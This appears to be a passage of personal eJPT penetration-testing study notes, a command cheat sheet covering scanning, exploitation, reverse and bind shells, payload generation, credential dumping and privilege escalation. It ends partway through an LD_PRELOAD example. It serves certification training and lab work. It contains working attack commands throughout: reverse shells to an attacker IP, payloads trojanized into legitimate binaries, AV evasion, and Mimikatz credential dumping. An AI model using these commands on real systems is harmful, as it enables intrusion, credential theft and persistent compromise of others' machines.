# eJPT Knowledge Base
> Compiled from personal lab notes 

---

## TABLE OF CONTENTS
1. [Scanning & Enumeration](#1-scanning--enumeration)
2. [Exploitation](#2-exploitation)
3. [Shells](#3-shells)
4. [Post-Exploitation — Local Enumeration](#4-post-exploitation--local-enumeration)
5. [Transferring Files](#5-transferring-files)
6. [Shell Upgrading](#6-shell-upgrading)
7. [Privilege Escalation](#7-privilege-escalation)
8. [Persistence](#8-persistence)
9. [Dumping & Cracking Hashes](#9-dumping--cracking-hashes)
10. [Pivoting](#10-pivoting)
11. [Clearing Tracks](#11-clearing-tracks)
12. [AV Evasion](#12-av-evasion)
13. [Quick Reference — CVEs & Ports](#13-quick-reference--common-cves--exploits)
14. [Web Application Pentesting](#14-web-application-pentesting)
15. [eJPT Exam Info](#15-ejpt-exam-info)
16. [Study Resources & Practice Labs](#16-study-resources--practice-labs)

---

## 1. Scanning & Enumeration

### Host Discovery — Ping Sweep
```bash
fping -a -g 192.168.1.0/24 2>/dev/null        # Fast sweep, suppress errors
nmap -sn 192.168.1.0/24                        # Nmap host discovery
nmap -sn -iL networks.txt                      # From file

# Manual bash ping sweep:
for host in {1..254}; do
  ping -c 1 192.168.1.$host | grep "64 bytes" | cut -d":" -f1 | cut -d" " -f4
done
```

### Nmap Scans
```bash
nmap -sV -O -T4 <target>                       # Version + OS detection
nmap -sS -A <target>                           # SYN scan + aggressive detection
nmap -sC -sV <target>                          # Default scripts + version
nmap -sC -sV -p- <target>                      # Full TCP all ports
nmap -sU -sV <target>                          # UDP scan
nmap -Pn -O <target>                           # OS detection, skip ping
nmap -sS -p 1-100,443 <target>                 # Custom port range
nmap --script=vuln -p <ports> <target>         # Vuln scripts on open ports
nmap --reason --open <target>                  # Show why port is open/closed
nmap -sV -p 80 --script=http-shellshock \
     --script-args "http-shellshock.uri=/gettime.cgi" <target>
nmap --script=banner <target>                  # Banner grabbing
ls -al /usr/share/nmap/scripts/ | grep banner  # List banner scripts

# Nmap scan type notes:
# -sT = TCP Connect (logged by apps)
# -sS = TCP SYN (stealthier, usually not logged)
# -sV = Version detection (TCP Connect + banner)
```

### Masscan (very fast port scan)
```bash
masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners <subnet>
masscan --echo > masscan.conf                  # Save config
masscan -c masscan.conf                        # Use saved config
```

### Banner Grabbing with Netcat
```bash
nc <ip> 22
nc -n -v <ip> <port>
nc -nvu <ip> <port>    # UDP

# HTTP banner:
nc <ip> 80
HEAD / HTTP/1.0
```

### OS Identification
```bash
nmap -Pn -O <ip>
rpcclient -U "" -N <ip>       # then type: srvinfo
nc <ip> 22                    # SSH banner often reveals OS
enum4linux -O <ip>
# Nmap script: --script smb-os-discovery
```

### SMB Enumeration
```bash
# enum4linux
enum4linux -a <ip>                             # Full enumeration
enum4linux -O <ip>                             # OS info
enum4linux -S <ip>                             # Shares only

# smbclient
smbclient -L //<ip> -N                         # List shares, no password
smbclient //<ip>/<share> -U <user>             # Connect to share

# smbmap
smbmap -u guest -p "" -d . -H <ip>             # Guest access
smbmap -u <user> -p '<pass>' -H <ip>           # Authenticated
smbmap -u <user> -p '<pass>' -H <ip> -x 'ipconfig'       # Run command
smbmap -u <user> -p '<pass>' -H <ip> -L                  # List drives
smbmap -u <user> -p '<pass>' -H <ip> -r 'C$'             # List directory
smbmap -u <user> -p '<pass>' -H <ip> --download 'C$\flag.txt'
smbmap -u <user> -p '<pass>' -H <ip> --upload '/root/shell' 'C$\shell'

# crackmapexec
crackmapexec smb <ip> -u <user> -p <pass> --shares
```

### Metasploit SMB Modules
```
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor
```

### Network Info (Post-Access / Auditing)
```bash
ip route                                       # Show routes (Linux)
route                                          # Alt (Linux)
route print                                    # Windows
ip route add <subnet> via <gateway>            # Add manual route
ip addr                                        # IP addresses (Linux)
ip neighbour                                   # CAM/ARP table (Linux)
arp -a                                         # ARP cache (Win/Linux)

# Listening ports:
netstat -tunp                                  # Linux
lsof -i -P -n | grep LISTEN                    # Linux alt
ss -tuln                                       # Linux alt
netstat -ano                                   # Windows
Get-NetTCPConnection | where {$_.State -eq 'Listen'}   # PowerShell
```

### ARP Spoofing (MitM)
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward        # Enable IP forwarding
arpspoof -i eth0 -t <target_ip> -r <host_ip>
# Example: intercept traffic between .11 and .16:
arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16
```

### OSINT Tools
```bash
whois <domain>                                 # Registrar, CIDR, org name
dnsrecon -d <domain>                           # DNS records: A, MX, NS, TXT, AAAA
sublist3r -d <domain>                          # Subdomain enumeration
theHarvester -d <domain> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh
whatweb -a 1 <domain>                          # Stealth tech fingerprint
wafw00f <domain>                               # WAF detection (-a for all)
```
Online: `netcraft.com`, `dnsdumpster.com`, `nvd.nist.gov`, `haveibeenpwned.com`, `breachdirectory.org`

### Web Directory Enumeration
```bash
dirb http://<ip>/wp-content/plugins /usr/share/nmap/nselib/data/wp-plugins.lst
```

### DNS Active Recon
```bash
dnsenum <domain>                               # Zone transfer + brute-forcing auto
dig axfr @<nameserver> <domain>               # Manual zone transfer
fierce --domain <domain>                      # Zone transfer + brute-force
```

### SSH Enumeration
```bash
nc <ip> 22                                     # Banner grab
ssh root@<ip>                                  # Test connection / check auth methods

# Nmap scripts:
nmap -p22 --script ssh2-enum-algos <ip>        # Enum supported encryption algorithms
nmap -p22 --script ssh-hostkey --script-args ssh_hostkey=full <ip>
nmap -p22 --script ssh-auth-methods --script-args="ssh.user=root" <ip>
nmap -p22 --script ssh-brute <ip>              # Brute force
```

### FTP Enumeration
```bash
nmap --script=ftp-anon <ip> -p21 -v           # Check for anonymous login
nmap -A -p21 <ip> -v
nmap -p21 --script ftp-brute --script-args userdb=/root/users.txt <ip>
ftp <ip>                                       # Connect (try anonymous:anonymous)

# Hydra FTP brute force:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<ip>
```

### HTTP Enumeration (Nmap Scripts)
```bash
nmap -p80 --script http-enum <ip>             # Discover interesting paths & files
nmap -p80 --script http-headers <ip>          # Grab HTTP headers
nmap -p80 --script http-methods <ip>          # Enumerate allowed HTTP methods
nmap -p80 --script http-webdav-scan <ip>      # Check for WebDAV
```

### SMTP Enumeration (port 25)
```bash
nmap -p25 --script smtp-enum-users <ip>       # Enumerate users via VRFY/EXPN
nmap -p25 --script smtp-commands <ip>         # List SMTP commands supported

# Metasploit:
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <ip>
run

# Netcat manual banner grab:
nc <ip> 25
VRFY root                                      # Check if user exists
VRFY admin
```

### MySQL Enumeration (port 3306)
```bash
mysql -u root -p -h <ip>                       # Connect directly
# In MySQL shell:
show databases;
use <database>;
show tables;
select * from <table>;

# Metasploit modules:
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login        # Brute force
use auxiliary/scanner/mysql/mysql_hashdump     # Dump hashes (requires creds)
use auxiliary/scanner/mysql/mysql_schemadump   # Dump schema
use auxiliary/admin/mysql/mysql_enum           # Enumerate users, privileges
use auxiliary/admin/mysql/mysql_sql            # Run arbitrary SQL
```

### MSSQL Enumeration (port 1433)
```bash
nmap -p1433 --script ms-sql-info <ip>
nmap -p1433 --script ms-sql-config <ip>
nmap -p1433 --script ms-sql-empty-password <ip>

# Dump hashes with credentials:
nmap -p1433 --script ms-sql-dump-hashes \
  --script-args mssql.username=sa,mssql.password=password123 <ip>

# Metasploit:
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_exec          # Execute commands (xp_cmdshell)
  set CMD whoami
```

### RDP Enumeration & Attacks (port 3389)
```bash
nmap -sV -p3389 <ip>
# RDP is disabled by default on Windows

# Brute force:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://<ip> -s 3389

# Connect:
xfreerdp /u:<user> /p:<pass> /v:<ip>
xfreerdp /u:<user> /p:<pass> /v:<ip> /w:1920 /h:1080 /fonts /smart-sizing

# BlueKeep (CVE-2019-0708) — RCE pre-auth, Windows 7/Server 2008:
nmap -p3389 --script rdp-vuln-ms12-020 <ip>
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show targets                                   # Must set correct target
set target <n>
exploit
# WARNING: Can crash/BSOD the target — use carefully
```

### WinRM Enumeration & Attacks (port 5985/5986)
```bash
nmap -sV -p5985 <ip>
nmap --top-ports 7000 <ip>                     # Check if WinRM port is open

# Metasploit modules:
use auxiliary/scanner/winrm/winrm_auth_methods # Check auth methods
use auxiliary/scanner/winrm/winrm_login        # Brute force
  set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
  set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
use auxiliary/scanner/winrm/winrm_cmd          # Run command with creds
  set USERNAME <user>
  set PASSWORD <pass>
  set CMD whoami
use exploit/windows/winrm/winrm_script_exec    # Get shell
  set USERNAME <user>
  set PASSWORD <pass>
  set FORCE_VBS true

# CrackMapExec:
crackmapexec winrm <ip> -u <user> -p <pass>            # Auth check
crackmapexec winrm <ip> -u <user> -p <pass> -x "whoami"     # Execute command
crackmapexec winrm <ip> -u <user> -p <pass> -x "systeminfo"

# evil-winrm (get interactive shell):
evil-winrm -i <ip> -u <user> -p '<pass>'
evil-winrm -i <ip> -u <user> -H <ntlm_hash>   # Pass-the-hash
```

### SSL / Heartbleed (CVE-2014-0160)
```bash
nmap -sV --script ssl-enum-ciphers -p 443 <ip>
nmap -sV --script ssl-heartbleed -p 443 <ip>
# Metasploit:
use auxiliary/scanner/ssl/openssl_heartbleed
```

### Log4Shell (CVE-2021-44228)
```bash
nmap --script log4shell.nse \
  --script-args log4shell.callback-server=<attacker_ip>:1389 \
  -p 8080 <target_ip>
```

### Apache Tomcat (port 8080)
```bash
# Tomcat serves on 8080 (standard Apache on 80/443)
# Versions below 9 vulnerable to JSP payload, especially 8.5.19
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
set SHELL cmd
run
```

### Metasploit — HTTP Auxiliary Modules
```
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/apache_userdir_enum
```

### Metasploit — FTP Auxiliary Modules
```
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/anonymous
```

### Nmap — Service-Specific Brute Force Scripts
```bash
# Nmap naming convention: <service>-brute
nmap -p22 --script ssh-brute <ip>
nmap -p445 --script smb-brute <ip>
nmap -p445 --script=smb-vuln-* <ip> -v       # All SMB vuln scripts
nmap -p135,139,445 --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains <ip>
```

### SearchSploit
```bash
searchsploit <service> <version>
searchsploit -m <id>                          # Copy exploit to current directory
searchsploit -w <id>                          # Show exploit-db URL
searchsploit remote windows smb | grep EternalBlue
cat /usr/share/nmap/scripts/script.db | grep -i exploit | cut -d ' ' -f 5  # List nmap exploit scripts
```
Online exploit resources: `exploit-db.com`, `rapid7.com/db`, `packetstormsecurity.com`

### Windows File Search (CMD)
```cmd
dir /b/s "*.conf*"
dir /b/s "*.txt*"
dir /b/s "*filename*"
wmic logicaldisk get Caption,Description,providername   # List drives
net users                                               # List users
route print
netstat -r
```

---

## 2. Exploitation

### Rejetto HFS 2.3.x (CVE-2014-6287) — EDB-39161
```bash
# Setup on attacker:
cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
python -m SimpleHTTPServer 80
nc -nvlp 1234

# Copy & edit the exploit:
searchsploit -m 39161.py
nano 39161.py   # Set ip_addr and local_port
python 39161.py <target_ip> 80
```

### libssh Authentication Bypass (CVE-2018-10933)
```bash
# Metasploit
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS <target>
set SPAWN_PTY true
exploit
sessions -u <id>    # Upgrade to meterpreter
```

### FlatCore CMS 2.0.7 — RCE (Authenticated)
```bash
# searchsploit flatcore → use 50262.py
python3 50262.py http://<target>/ admin password1
```

### WordPress — Duplicator Plugin (CVE-2020-11738)
```bash
use auxiliary/scanner/http/wp_duplicator_file_read
set RHOSTS <target>
set FILEPATH /etc/passwd   # or /flag.txt etc.
exploit
```

### Java RMI Server
```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <target>
set LHOST <attacker_ip>
exploit
# Usually gets root on vulnerable Linux boxes
```

### ProFTPD 1.3.5 — mod_copy (EDB-36803)
```bash
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS <target>
set LHOST <interface>
set SITEPATH /var/www/html
exploit
```

### EternalBlue / MS17-010
```bash
nmap --script smb-vuln-ms17-010 -p445 <ip>   # Check vulnerability first

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <attacker_ip>
exploit

# AutoBlue (manual alternative):
# git clone AutoBlue-MS17-010 → run shell_prep.sh → nc -nvlp 1234
# python eternalblue_exploit7.py <target_ip> shellcode/sc_x64.bin
```

### vsftpd 2.3.4 Backdoor (CVE-2011-2523)
```bash
# vsftpd v2.3.4 had a malicious backdoor added via supply chain attack
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
exploit
# After shell: /bin/bash -i
```

### Samba RCE — is_known_pipename (CVE-2017-7494)
```bash
# Samba v3.5.0 — attacker uploads shared library, server executes it
use exploit/linux/samba/is_known_pipename
set RHOSTS <target>
exploit
# If shell (not meterpreter): use sessions -u <id> to upgrade
```

### Haraka SMTP RCE (CVE-2017-16137)
```bash
# Haraka SMTP server versions before 2.8.9 — command injection
searchsploit haraka
# Use exploit from exploit-db, set target SMTP server
```

### CrackMapExec — Code Execution with Hashes
```bash
# SMB command execution with pass-the-hash:
crackmapexec smb <ip> -u administrator -H '<ntlm_hash>'
crackmapexec smb <ip> -u administrator -H '<ntlm_hash>' -x 'ipconfig'
crackmapexec smb <ip> -u administrator -H '<ntlm_hash>' -x 'net user administrator Password123!'

# If WinRM is open, get full shell via evil-winrm with hash:
evil-winrm -i <ip> -u administrator -H <ntlm_hash>
```

### MySQL / WordPress Credential Reset
```bash
mysql -u root -p -h <target_ip>
show databases;
use wordpress;
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';

# Restart service (Windows WAMP):
net stop wampapache
net start wampapache
```

### Compiling Exploits
```bash
# Windows 32-bit PE (runs on both x86 and x64):
i686-w64-mingw32-gcc 9303.c -o exploit
i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32   # with WinSock

# Linux binary:
gcc -pthread 40839.c -o dirty -lcrypt
```

### PHP Webshell via FTP Upload
```bash
ftp <user>@<target_ip>
# Password prompt
ftp> put php-reverse-shell.php
# Then browse to http://<target>/php-reverse-shell.php
```

### ASPX Webshell (Windows / IIS)
```bash
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<ip> LPORT=4433 -f aspx > shelly.aspx
ftp <user>@<target_ip>
ftp> put shelly.aspx
# Browse to http://<target>/shelly.aspx to trigger
```

### Brute Force — Hydra
```bash
hydra -U ftp                                   # Show module help for a service
hydra -L users.txt -P pass.txt ftp://<ip>
hydra -l admin -P pass.txt -f ftp://<ip>       # -f = stop on first hit
hydra -l <user> -P /usr/share/wordlists/metasploit/unix_passwords.txt <target> ssh
hydra -L users.txt -P pass.txt <ip> \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:Incorrect credentials" -f -V
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /root/Desktop/wordlists/100-common-passwords.txt \
  <target> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
# F= defines the failure string to detect wrong credentials
```

### Brute Force — Metasploit SSH
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USERNAME <user>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set BRUTEFORCE_SPEED 3
set VERBOSE true
exploit
```

### SMB Login (Pass-the-Hash)
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set SMBUser <user>
set SMBPass aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>
set CreateSession true
exploit
```

### web_delivery — Payload Delivery via Web Server
```bash
use exploit/multi/script/web_delivery
set target PSH          # PowerShell
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand False
exploit
```

### msfvenom — Payload Generation
```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders

# Staged vs Non-staged:
# windows/x64/meterpreter/reverse_tcp   = STAGED (smaller, needs handler)
# windows/x64/meterpreter_reverse_tcp   = NON-STAGED (self-contained)

# Windows EXE:
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > payload.exe
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > payload64.exe

# Linux ELF:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > payload.elf

# ASPX (Windows/IIS):
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f aspx > shell.aspx

# JSP (Java):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp

# WAR (Tomcat):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war

# PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php

# Encoded (AV evasion) — shikata_ga_nai, 10 iterations:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> \
  -e x86/shikata_ga_nai -i 10 -f exe > payload_encoded.exe

# Inject into legit binary:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> \
  -e x86/shikata_ga_nai -i 10 -f exe -x winrar.exe > malicious_winrar.exe

# Handler to catch staged payload:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
exploit
```

### Process Migration (post-exploit stability)
```bash
# After getting meterpreter, migrate to a stable process:
run post/windows/manage/migrate        # Auto-migrate
ps -U SYSTEM                           # Find SYSTEM processes
migrate <pid>                          # Manual migrate
```

### WebDAV Exploitation
```bash
# Check what file types can be uploaded and executed:
davtest -url http://<ip>/webdav/
davtest -auth <user>:<pass> -url http://<ip>/webdav/

# Upload webshell via cadaver:
cadaver http://<ip>/webdav/
dav> put /usr/share/webshells/asp/webshell.asp

# Brute force WebDAV basic auth:
hydra -L users.txt -P passwords.txt <ip> http-get /webdav/

# Generate ASP meterpreter payload and upload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f asp > shell.asp
# Upload via cadaver, then trigger in browser:
# http://<ip>/webdav/shell.asp

# Metasploit IIS WebDAV upload (all-in-one):
use exploit/windows/iis/iis_webdav_upload_asp
set HttpUsername <user>
set HttpPassword <pass>
set PATH /webdav/shell.asp
set LHOST <ip>
set LPORT 4444
exploit
```

### WinRM — Evil-WinRM (port 5985/5986)
```bash
evil-winrm.rb -u <user> -p <pass> -i <ip>     # Get a shell via WinRM
# Brute force with CrackMapExec (Hydra doesn't support WinRM):
crackmapexec winrm <ip> -d <domain> -u users.txt -p passwords.txt
```

### UAC Bypass (Windows)
```bash
# In meterpreter — background session first, then:
use exploit/windows/local/bypassuac
set SESSION <id>
exploit
# Then: getsystem
```

### Linux — Unshadow (combine passwd + shadow for John)
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

---

## 3. Shells

### Bind Shell (target listens, attacker connects)
```bash
# On Windows target:
certutil -urlcache -f http://<kali_ip>/nc.exe nc.exe
nc.exe -nvlp 1234 -e cmd.exe

# On attacker:
nc -nv <target_ip> 1234
```

### Reverse Shell (target connects back)
```bash
# On attacker:
nc -nvlp 1234

# On Windows target:
nc.exe -nv <attacker_ip> 1234 -e cmd.exe

# On Linux target:
/bin/bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1
```

### Shell → Meterpreter Upgrade
```bash
# In msfconsole:
sessions -u <session_id>

# Or manually:
use post/multi/manage/shell_to_meterpreter
set SESSION <id>
run
```

---

## 4. Post-Exploitation — Local Enumeration

### Windows Enumeration
```cmd
REM System info
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

REM Users & groups
whoami /priv
query user
net users
net user <username>
net localgroup
net localgroup <groupname>
net start

REM Network
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles

REM Processes & tasks
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST /v
ps
```

### Windows — Metasploit Post Modules
```
search win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
```

### Windows — Automated Enumeration (JAWS)
```powershell
# On target:
powershell.exe -ExecutionPolicy Bypass -File .\jaws.ps1 -OutputFilename JAWS.txt
```

### Linux Enumeration
```bash
# System info
hostname
cat /etc/issue
cat /etc/*release
uname -a && uname -r
env && lscpu
free -h                        # RAM usage
df -h && df -ht ext4
lsblk | grep sd
dpkg -l                        # Installed packages

# Users & groups
cat /etc/passwd
cat /etc/passwd | grep -v /nologin
cat /etc/group
cat /etc/shadow                # Requires root
groups                         # Current user groups
groups <user>                  # Groups for specific user
w                              # Who is logged in + what they're doing
who
last                           # Login history
lastlog                        # Last login per user

# Network
ifconfig
ip a s
cat /etc/hosts
cat /etc/hostname
cat /etc/resolv.conf
cat /etc/networks
arp -a
route
netstat

# Processes & cron jobs
ps aux
ps aux | grep root
top
crontab -l
cat /etc/crontab
ls -al /etc/cron*
```

### Linux — Metasploit Post Modules
```
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system
```

### Meterpreter — Essential Post Commands
```bash
sysinfo
getuid
getprivs
ps
pgrep <processname>            # Get PID of process
migrate <PID>
ifconfig
netstat
route
arp

# Search all post modules for current platform:
search type:post platform:windows gather
search type:post platform:linux gather
```

### Linux — Automated Enumeration (LinEnum)
```bash
# Download from: github.com/rebootuser/LinEnum
chmod +x LinEnum.sh
./LinEnum.sh
```

---

## 5. Transferring Files

### Windows
```cmd
certutil -urlcache -f http://<kali_ip>/<file> <file>
```

### Linux
```bash
wget http://<kali_ip>/<file>
```

### Set up HTTP server on Kali
```bash
python -m SimpleHTTPServer 80       # Python 2 only
python3 -m http.server 80           # Python 3 (use this on modern Kali)
```

### Send/receive with Netcat
```bash
# Sender:
nc -nv <target_ip> 1234 < file.txt

# Receiver:
nc.exe -nvlp 1234 > received.txt
```

### SCP (copy SSH key or file)
```bash
scp <user>@<target_ip>:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa <user>@<target_ip>
```

### Meterpreter
```bash
upload <local_file> <remote_path>
download <remote_file>
```

### Tmux (multi-window management)
```
Ctrl+B, C    → new window
Ctrl+B, 0    → switch to window 0
```

---

## 6. Shell Upgrading

```bash
cat /etc/shells               # Check available shells

# Python PTY:
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Other methods:
perl -e 'exec "/bin/bash";'
ruby: exec "/bin/bash"
/bin/bash -i

# Fix environment after upgrade:
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
```

### Full TTY Stabilization (most stable method)
```bash
# Step 1 — on target, spawn PTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# Step 2 — background it with Ctrl+Z, then on attacker:
stty raw -echo && fg          # Gives full interactive TTY (arrow keys, tab, Ctrl+C)
```

### Escape rbash / Restricted Shells
```bash
find / -exec /bin/bash -p \; -quit
find / -exec /bin/rbash -p \; -quit
echo $(<path/to/file)          # Read file without cat
```

---

## 7. Privilege Escalation

### Windows PrivEsc

#### PrivescCheck (PowerShell)
```powershell
# Upload PrivescCheck.ps1 then run:
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
# Source: https://github.com/itm4n/PrivescCheck
```

#### Shell → Meterpreter (needed for hashdump, migrate, etc.)
```
show advanced
set WIN_TRANSFER VBS
shell
# Or use sessions -u <id>
```

#### Migrate to LSASS
```
pgrep lsass
migrate <pid>
hashdump
```

#### PSEXEC (after getting credentials / hashes)
```bash
# Metasploit:
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass <password_or_hash>
set RHOSTS <target>
exploit

# Python:
python psexec.py Administrator@<target_ip>
```

#### Enable RDP & Add User
```
run getgui -e -u <newuser> -p <password_01>
xfreerdp /u:<user> /p:<password> /v:<target_ip>
```

#### PowerUp — Automated Windows PrivEsc
```powershell
# Upload PowerUp.ps1 (from PowerSploit) to target, then:
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit                      # Finds misconfigs, leftover files

# If it finds Unattend.xml with base64 password:
$password = 'QWRtaW5AMTIz'
$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
runas.exe /user:administrator cmd
```

#### Unattend.xml — Cleartext / Base64 Credentials
```bash
# Windows setup automation files — often left behind with credentials:
# C:\Windows\Panther\Unattend.xml
# C:\Windows\Panther\Autounattend.xml

# Download in meterpreter and search for passwords:
download C:\\Windows\\Panther\\Unattend.xml
# Passwords may be base64 encoded — decode with:
echo '<base64string>' | base64 -d
```

#### UACMe (Advanced UAC Bypass)
```bash
# https://github.com/hfiref0x/UACME
# Requires local admin account. Steps:
# 1. Migrate to explorer.exe first:
pgrep explorer
migrate <explorer_pid>
# 2. Generate payload and upload both:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > backdoor.exe
upload backdoor.exe C:\\Users\\admin\\AppData\\Local\\Temp\\backdoor.exe
upload Akagi64.exe C:\\Users\\admin\\AppData\\Local\\Temp\\Akagi64.exe
# 3. Start handler, then run on target:
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
# 4. Get elevated session → getsystem → migrate lsass → hashdump
```

#### Alternate Data Streams (ADS) — Windows NTFS
```bash
# NTFS files have a data stream (visible) and resource stream (metadata)
# Hiding a payload inside an ADS:
type payload.exe > windowslog.txt:winpass.exe   # Embed exe in ADS
mklink wsupdate.exe windowslog.txt:winpass.exe  # Create symlink to ADS
wsupdate                                         # Execute hidden payload

# View hidden data:
notepad test.txt:secret.txt
```
```
# In meterpreter session:
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
# NOTE: Kernel exploits can make the OS unstable — use as last resort
```

#### Windows Exploit Suggester (manual)
```bash
# https://github.com/AonCyberLabs/Windows-Exploit-Suggester
# https://github.com/SecWiki/windows-kernel-exploits
```

#### Access Token Impersonation (Incognito)
```bash
# In meterpreter — requires SeImpersonatePrivilege:
load incognito
list_tokens -u                          # List available tokens
impersonate_token "DOMAIN\\Administrator"
getuid                                  # Verify impersonation worked
```

#### Unquoted Service Path
```bash
# Find services with unquoted paths in Metasploit:
use post/windows/gather/enum_unquoted_service_paths
# Place a malicious exe at the unquoted path location
# Restart the service to execute it
```

#### Credential Dumping — Kiwi (in-memory, Windows)
```bash
# In meterpreter (must be SYSTEM):
load kiwi
lsa_dump_sam                            # Dump SAM hashes
lsa_dump_secrets                        # Dump LSA secrets
creds_all                               # Dump all credentials
```

#### Mimikatz (on target Windows machine)
```
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords      # Dump plaintext passwords from memory
mimikatz> lsadump::sam                  # Dump SAM hashes
```

---

### Linux PrivEsc

#### Linux Exploit Suggester
```bash
# https://github.com/mzet-/linux-exploit-suggester
./linux-exploit-suggester.sh
```

#### Find World-Writable Files
```bash
find / -not -type l -perm -o+w 2>/dev/null
```

#### Check Sudo Rights
```bash
sudo -l
# If you can run "man" as sudo:
sudo man ls
# Then in man: !/bin/bash
```

#### SUID / SGID Abuse
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -o -perm -2000 2>/dev/null
```

#### Misconfigured Cron Jobs
```bash
cat /etc/crontab
crontab -l
ls -al /etc/cron*
# If a writable script runs as root via cron, append reverse shell to it:
echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" >> /path/to/cron_script.sh
```

#### Misconfigured File Permissions
```bash
# If /etc/passwd is writable — add a root user:
openssl passwd -1 -salt abc pass123        # Generate hash
echo 'hacker:$1$abc$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

# If /etc/shadow is readable — grab and crack hashes:
cat /etc/shadow
john --format=sha512crypt shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Add root via shadow modification (if writable):
openssl passwd -1 -salt abc pass123
nano /etc/shadow      # Replace root's hash with new one
su root               # Use new password
```

#### LD_PRELOAD Sudo Abuse
```bash
# If "env_keep+=LD_PRELOAD" appears in sudo -l output:
# 1. Create malicious shared library:
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash");
}
EOF
